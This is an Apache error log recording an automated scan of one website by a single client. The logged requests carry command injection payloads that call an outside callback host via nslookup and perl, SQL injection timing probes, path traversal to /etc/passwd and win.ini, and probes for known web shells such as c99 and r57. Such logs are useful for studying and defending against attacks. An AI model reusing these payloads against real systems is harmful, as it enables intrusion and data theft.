[Thu Jul 08 00:26:31.234155 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/settings.inc.php' not found or unable to stat
[Thu Jul 08 00:26:31.547347 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/global.inc.php' not found or unable to stat
[Thu Jul 08 00:26:31.752625 2021] [authz_core:error] [pid 29681] [client 27.147.202.214:10276] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/fonts/.htaccess~
[Thu Jul 08 00:26:31.857547 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/database.php' not found or unable to stat
[Thu Jul 08 00:26:31.960701 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/old_c525.php' not found or unable to stat
[Thu Jul 08 00:26:32.080759 2021] [authz_core:error] [pid 29681] [client 27.147.202.214:10276] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/fonts/.htaccess.old
[Thu Jul 08 00:26:32.264733 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/c525_old.php' not found or unable to stat
[Thu Jul 08 00:26:32.375959 2021] [php7:error] [pid 29687] [client 27.147.202.214:2393] script '/var/www/html/wilkescw.com/c501' AND 2*3*8=6*8 AND '03Ur'='03Ur.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:32.412519 2021] [authz_core:error] [pid 29681] [client 27.147.202.214:10276] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/fonts/.htaccess.save
[Thu Jul 08 00:26:32.419246 2021] [php7:error] [pid 29771] [client 27.147.202.214:13129] script '/var/www/html/wilkescw.com/`(nslookup hitgwqmzzwcna82e17.bxss.me||perl -e "gethostbyname('hitgwqmzzwcna82e17.bxss.me')")`.php' not found or unable to stat
[Thu Jul 08 00:26:32.462490 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/database.inc.php' not found or unable to stat
[Thu Jul 08 00:26:32.508764 2021] [core:error] [pid 29722] [client 27.147.202.214:3250] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:32.569261 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/c525_bak.php' not found or unable to stat
[Thu Jul 08 00:26:32.696388 2021] [php7:error] [pid 29687] [client 27.147.202.214:2393] script '/var/www/html/wilkescw.com/c501" AND 2*3*8=6*8 AND "NRXV"="NRXV.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:32.822460 2021] [core:error] [pid 29664] [client 27.147.202.214:3175] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:33.004920 2021] [php7:error] [pid 29687] [client 27.147.202.214:2393] script '/var/www/html/wilkescw.com/c501%' AND 2*3*8=6*8 AND 'EoRT'!='EoRT%.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:33.012303 2021] [core:error] [pid 29697] (36)File name too long: [client 27.147.202.214:14142] AH00036: access to /;(nslookup hitxzxgtllslsd7244.bxss.me||perl -e "gethostbyname('hitxzxgtllslsd7244.bxss.me')")|(nslookup hitxzxgtllslsd7244.bxss.me||perl -e "gethostbyname('hitxzxgtllslsd7244.bxss.me')")&(nslookup hitxzxgtllslsd7244.bxss.me||perl -e "gethostbyname('hitxzxgtllslsd7244.bxss.me')").php failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitxzxgtllslsd7244.bxss.me||perl -e "gethostbyname('hitxzxgtllslsd7244.bxss.me')")|(nslookup hitxzxgtllslsd7244.bxss.me||perl -e "gethostbyname('hitxzxgtllslsd7244.bxss.me')")&(nslookup hitxzxgtllslsd7244.bxss.me||perl -e "gethostbyname('hitxzxgtllslsd7244.bxss.me')").php')
[Thu Jul 08 00:26:33.438565 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/c650c7qOZ.php' not found or unable to stat
[Thu Jul 08 00:26:33.493117 2021] [php7:error] [pid 29780] [client 27.147.202.214:3231] script '/var/www/html/wilkescw.com/old_c616.php' not found or unable to stat
[Thu Jul 08 00:26:33.695346 2021] [core:error] [pid 29771] [client 27.147.202.214:13129] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:33.805594 2021] [php7:error] [pid 29688] [client 27.147.202.214:8246] script '/var/www/html/wilkescw.com/c616_old.php' not found or unable to stat
[Thu Jul 08 00:26:34.010485 2021] [core:error] [pid 29697] [client 27.147.202.214:14142] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:34.028120 2021] [negotiation:error] [pid 29781] [client 27.147.202.214:2864] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/c650 (None could be negotiated).
[Thu Jul 08 00:26:34.107062 2021] [php7:error] [pid 29688] [client 27.147.202.214:8246] script '/var/www/html/wilkescw.com/c616_bak.php' not found or unable to stat
[Thu Jul 08 00:26:34.192178 2021] [php7:error] [pid 29687] [client 27.147.202.214:2393] script '/var/www/html/wilkescw.com/-1 OR 2+833-833-1=0+0+0+1.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:34.258162 2021] [php7:error] [pid 29648] [client 27.147.202.214:12579] script '/var/www/html/wilkescw.com/how_to42G1M.php' not found or unable to stat
[Thu Jul 08 00:26:34.496991 2021] [php7:error] [pid 29732] [client 27.147.202.214:2014] script '/var/www/html/wilkescw.com/-1 OR 3+833-833-1=0+0+0+1.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:34.504851 2021] [core:error] [pid 29687] (36)File name too long: [client 27.147.202.214:2393] AH00036: access to /;(nslookup hitbjjmminyzea2d4b.bxss.me||perl -e "gethostbyname('hitbjjmminyzea2d4b.bxss.me')")|(nslookup hitbjjmminyzea2d4b.bxss.me||perl -e "gethostbyname('hitbjjmminyzea2d4b.bxss.me')")&(nslookup hitbjjmminyzea2d4b.bxss.me||perl -e "gethostbyname('hitbjjmminyzea2d4b.bxss.me')")/main.css failed (filesystem path '/var/www/html/wilkescw.com/;(nslookup hitbjjmminyzea2d4b.bxss.me||perl -e "gethostbyname('hitbjjmminyzea2d4b.bxss.me')")|(nslookup hitbjjmminyzea2d4b.bxss.me||perl -e "gethostbyname('hitbjjmminyzea2d4b.bxss.me')")&(nslookup hitbjjmminyzea2d4b.bxss.me||perl -e "gethostbyname('hitbjjmminyzea2d4b.bxss.me')")')
[Thu Jul 08 00:26:34.575251 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/fi6ojc650.php' not found or unable to stat
[Thu Jul 08 00:26:34.812583 2021] [php7:error] [pid 29732] [client 27.147.202.214:2014] script '/var/www/html/wilkescw.com/c501'||'.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:34.852549 2021] [php7:error] [pid 29507] [client 27.147.202.214:1986] script '/var/www/html/wilkescw.com/R0GI8how_to.php' not found or unable to stat
[Thu Jul 08 00:26:35.039434 2021] [core:error] [pid 29527] [client 27.147.202.214:8363] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:35.201521 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/important_information2JqoI.php' not found or unable to stat
[Thu Jul 08 00:26:35.322987 2021] [php7:error] [pid 29656] [client 27.147.202.214:1749] script '/var/www/html/wilkescw.com/images/apc.php' not found or unable to stat
[Thu Jul 08 00:26:35.358525 2021] [core:error] [pid 29780] [client 27.147.202.214:3231] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:35.390415 2021] [php7:error] [pid 29688] [client 27.147.202.214:8246] script '/var/www/html/wilkescw.com/if(now()=sysdate(),sleep(15),0).php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:35.472421 2021] [negotiation:error] [pid 29615] [client 27.147.202.214:1766] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/how_to (None could be negotiated).
[Thu Jul 08 00:26:35.826349 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/JScO5important_information.php' not found or unable to stat
[Thu Jul 08 00:26:36.124793 2021] [core:error] [pid 29732] [client 27.147.202.214:2014] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:36.320436 2021] [php7:error] [pid 29688] [client 27.147.202.214:8246] script '/var/www/html/wilkescw.com/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:38.361883 2021] [php7:error] [pid 29688] [client 27.147.202.214:8246] script '/var/www/html/wilkescw.com/0"XOR(if(now()=sysdate(),sleep(15),0))XOR"Z.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:38.493725 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/old_c650.php' not found or unable to stat
[Thu Jul 08 00:26:38.789734 2021] [php7:error] [pid 29613] [client 27.147.202.214:2007] script '/var/www/html/wilkescw.com/c650_old.php' not found or unable to stat
[Thu Jul 08 00:26:39.102173 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/c650_bak.php' not found or unable to stat
[Thu Jul 08 00:26:39.432018 2021] [authz_core:error] [pid 29725] [client 27.147.202.214:2016] AH01630: client denied by server configuration: /var/www/html/wilkescw.com/images/.htaccess
[Thu Jul 08 00:26:39.885060 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/old_how_to.php' not found or unable to stat
[Thu Jul 08 00:26:39.886642 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/old_important_information.php' not found or unable to stat
[Thu Jul 08 00:26:40.199277 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/important_information_old.php' not found or unable to stat
[Thu Jul 08 00:26:40.202649 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/how_to_old.php' not found or unable to stat
[Thu Jul 08 00:26:40.265347 2021] [php7:error] [pid 29667] [client 27.147.202.214:1739] script '/var/www/html/wilkescw.com/1 waitfor delay '0:0:15' -- .php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:40.505805 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/important_information_bak.php' not found or unable to stat
[Thu Jul 08 00:26:40.524664 2021] [php7:error] [pid 29650] [client 27.147.202.214:14137] script '/var/www/html/wilkescw.com/how_to_bak.php' not found or unable to stat
[Thu Jul 08 00:26:40.724562 2021] [php7:error] [pid 29680] [client 27.147.202.214:1620] script '/var/www/html/wilkescw.com/images/phpinfo.php' not found or unable to stat
[Thu Jul 08 00:26:41.073247 2021] [php7:error] [pid 29854] [client 27.147.202.214:2055] script '/var/www/html/wilkescw.com/index1i6Vw.php' not found or unable to stat
[Thu Jul 08 00:26:41.200692 2021] [php7:error] [pid 29667] [client 27.147.202.214:1739] script '/var/www/html/wilkescw.com/CM5FlOEk'; waitfor delay '0:0:15' -- .php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:41.200910 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/r57shell.php' not found or unable to stat
[Thu Jul 08 00:26:41.286970 2021] [php7:error] [pid 29615] [client 27.147.202.214:1766] script '/var/www/html/wilkescw.com/images/webadmin.php' not found or unable to stat
[Thu Jul 08 00:26:41.341633 2021] [php7:error] [pid 29680] [client 27.147.202.214:1620] script '/var/www/html/wilkescw.com/images/pi.php' not found or unable to stat
[Thu Jul 08 00:26:41.376591 2021] [core:error] [pid 29612] [client 27.147.202.214:1748] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:41.504304 2021] [negotiation:error] [pid 29681] [client 27.147.202.214:2229] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/index (None could be negotiated).
[Thu Jul 08 00:26:41.528209 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/r57.php' not found or unable to stat
[Thu Jul 08 00:26:41.700125 2021] [php7:error] [pid 29854] [client 27.147.202.214:2055] script '/var/www/html/wilkescw.com/Oh8gVindex.php' not found or unable to stat
[Thu Jul 08 00:26:41.838171 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/r58.php' not found or unable to stat
[Thu Jul 08 00:26:41.991166 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/images/php.php' not found or unable to stat
[Thu Jul 08 00:26:42.164461 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/c99shell.php' not found or unable to stat
[Thu Jul 08 00:26:42.305783 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/images/i.php' not found or unable to stat
[Thu Jul 08 00:26:42.483095 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/c99.php' not found or unable to stat
[Thu Jul 08 00:26:42.623232 2021] [php7:error] [pid 29683] [client 27.147.202.214:3232] script '/var/www/html/wilkescw.com/images/test.php' not found or unable to stat
[Thu Jul 08 00:26:42.809643 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/nstview.php' not found or unable to stat
[Thu Jul 08 00:26:43.105638 2021] [autoindex:error] [pid 29851] [client 27.147.202.214:1993] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://wilkescw.com/
[Thu Jul 08 00:26:43.119826 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/nst.php' not found or unable to stat
[Thu Jul 08 00:26:43.169610 2021] [autoindex:error] [pid 29507] [client 27.147.202.214:1986] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:43.420609 2021] [php7:error] [pid 29667] [client 27.147.202.214:1739] script '/var/www/html/wilkescw.com/dQGUgAKy' OR 563=(SELECT 563 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:43.601920 2021] [core:error] [pid 29872] [client 27.147.202.214:1409] AH00126: Invalid URI in request GET /icons/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Thu Jul 08 00:26:43.708429 2021] [core:error] [pid 29876] [client 27.147.202.214:1454] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:43.769259 2021] [php7:error] [pid 29885] [client 27.147.202.214:1584] script '/usr/share/apache2/icons/o0hxq6laaipl.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:43.973641 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/rst.php' not found or unable to stat
[Thu Jul 08 00:26:44.006980 2021] [php7:error] [pid 29869] [client 27.147.202.214:1406] script '/var/www/html/wilkescw.com/images/temp.php' not found or unable to stat
[Thu Jul 08 00:26:44.043290 2021] [php7:error] [pid 29873] [client 27.147.202.214:1408] script '/var/www/html/wilkescw.com/images/_notes/1fr07crxwnov.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:44.266167 2021] [autoindex:error] [pid 29862] [client 27.147.202.214:2900] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:44.299040 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/r57eng.php' not found or unable to stat
[Thu Jul 08 00:26:44.318152 2021] [php7:error] [pid 29869] [client 27.147.202.214:1406] script '/var/www/html/wilkescw.com/images/info.php' not found or unable to stat
[Thu Jul 08 00:26:44.328345 2021] [core:error] [pid 29856] [client 27.147.202.214:2085] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:44.346522 2021] [php7:error] [pid 29667] [client 27.147.202.214:1739] script '/var/www/html/wilkescw.com/BxDh99kB') OR 562=(SELECT 562 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:44.350256 2021] [negotiation:error] [pid 29848] [client 27.147.202.214:1969] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/wilkescw.com/important_information (None could be negotiated).
[Thu Jul 08 00:26:44.451140 2021] [core:error] [pid 29849] [client 27.147.202.214:1588] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:44.561462 2021] [autoindex:error] [pid 29854] [client 27.147.202.214:2055] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:44.569692 2021] [autoindex:error] [pid 29862] [client 27.147.202.214:2900] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:44.624077 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/shell.php' not found or unable to stat
[Thu Jul 08 00:26:44.754233 2021] [core:error] [pid 29683] [client 27.147.202.214:3232] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:44.917726 2021] [autoindex:error] [pid 29869] [client 27.147.202.214:1406] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:44.930223 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/dra.php' not found or unable to stat
[Thu Jul 08 00:26:44.971005 2021] [core:error] [pid 29883] [client 27.147.202.214:1585] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Thu Jul 08 00:26:45.149840 2021] [autoindex:error] [pid 29890] [client 27.147.202.214:1593] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:45.168051 2021] [autoindex:error] [pid 29884] [client 27.147.202.214:1587] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:45.176085 2021] [autoindex:error] [pid 29862] [client 27.147.202.214:2900] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://wilkescw.com/
[Thu Jul 08 00:26:45.240151 2021] [autoindex:error] [pid 29869] [client 27.147.202.214:1406] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://wilkescw.com/css/main.css
[Thu Jul 08 00:26:45.258852 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/r.php' not found or unable to stat
[Thu Jul 08 00:26:45.276085 2021] [core:error] [pid 29648] [client 27.147.202.214:12579] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 00:26:45.410484 2021] [php7:error] [pid 29507] [client 27.147.202.214:1986] script '/var/www/html/wilkescw.com/bak.index.php' not found or unable to stat
[Thu Jul 08 00:26:45.583468 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/lol.php' not found or unable to stat
[Thu Jul 08 00:26:45.849007 2021] [php7:error] [pid 29887] [client 27.147.202.214:1590] script '/var/www/html/wilkescw.com/vO5FLAQ0')) OR 606=(SELECT 606 FROM PG_SLEEP(15))--.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:45.894295 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/zehir.php' not found or unable to stat
[Thu Jul 08 00:26:46.213883 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/c-h.v2.php' not found or unable to stat
[Thu Jul 08 00:26:46.533907 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/php-backdoor.php' not found or unable to stat
[Thu Jul 08 00:26:46.856231 2021] [php7:error] [pid 29725] [client 27.147.202.214:2016] script '/var/www/html/wilkescw.com/images/simple-backdoor.php' not found or unable to stat
[Thu Jul 08 00:26:47.069655 2021] [core:error] [pid 29865] [client 27.147.202.214:13338] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:47.113791 2021] [php7:error] [pid 29887] [client 27.147.202.214:1590] script '/var/www/html/wilkescw.com/c501'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),15)||'.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:47.364280 2021] [core:error] [pid 29870] [client 27.147.202.214:1407] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:47.420276 2021] [php7:error] [pid 29781] [client 27.147.202.214:2864] script '/var/www/html/wilkescw.com/1'".php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:47.438754 2021] [core:error] [pid 29854] [client 27.147.202.214:2055] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Thu Jul 08 00:26:47.688160 2021] [core:error] [pid 29885] [client 27.147.202.214:1584] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:47.978709 2021] [core:error] [pid 29848] [client 27.147.202.214:1969] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:48.024898 2021] [php7:error] [pid 29781] [client 27.147.202.214:2864] script '/var/www/html/wilkescw.com/@@fbdWh.php' not found or unable to stat, referer: https://wilkescw.com/
[Thu Jul 08 00:26:48.041023 2021] [core:error] [pid 29869] [client 27.147.202.214:1406] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Thu Jul 08 00:26:48.521513 2021] [php7:error] [pid 29875] [client 27.147.202.214:1410] script '/var/www/html/wilkescw.com/old.index.php' not found or unable to stat
[Thu Jul 08 00:26:48.652077 2021] [core:error] [pid 29507] [client 27.147.202.214:1986] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Thu Jul 08 00:26:48.765109 2021] [autoindex:error] [pid 29890] [client 27.147.202.214:1593] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Thu Jul 08 00:26:48.883987 2021] [core:error] [pid 29644] [client 27.147.202.214:1762] AH00126: Invalid URI in request GET /icons//../../../../../../../../etc/passwd HTTP/1.1
